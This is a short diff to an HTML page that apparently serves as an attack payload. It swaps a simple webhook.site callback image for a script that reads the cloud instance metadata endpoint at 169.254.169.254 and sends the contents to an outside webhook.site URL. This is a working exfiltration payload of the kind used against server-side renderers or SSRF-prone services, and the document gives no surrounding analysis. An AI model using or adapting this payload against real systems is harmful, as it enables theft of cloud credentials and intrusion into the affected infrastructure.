@@ -1,5 +1,9 @@
 <html>
 <body>
-<img src="http://webhook.site/1be56e61-1b58-4dfc-8d52-cc9304f503e9/a.html">
+<script>
+fetch('http://169.254.169.254/latest/meta-data/')
+  .then(r => r.text())
+  .then(d => { new Image().src = 'http://webhook.site/1be56e61-1b58-4dfc-8d52-cc9304f503e9/?data=' + encodeURIComponent(d); });
+</script>
 </body>
 </html>
